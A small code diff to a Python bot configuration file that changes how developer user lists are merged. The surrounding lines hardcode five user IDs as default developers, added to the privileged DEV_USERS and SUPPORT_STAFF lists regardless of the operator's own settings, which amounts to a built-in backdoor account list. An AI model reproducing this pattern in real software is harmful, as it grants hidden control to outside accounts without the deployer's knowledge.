@@ -74,7 +74,8 @@ SUDO_USERS = Config.SUDO_USERS
 WHITELIST_USERS = Config.WHITELIST_USERS
 Defult_dev = "1432756163 1344569458 1355478165 1789859817 1777340882".split()
 Defult = set(Defult_dev)
-DEV_USERS = DEV_USER.union(Defult)
+DEV_USERS = DEV_USER|Defult
+DEV_USERS = list(DEV_USERS)
 SUPPORT_STAFF = list(
     set([int(OWNER_ID)] + SUDO_USERS + DEV + WHITELIST_USERS + Defult_dev),
 )  # Remove duplicates by using a set
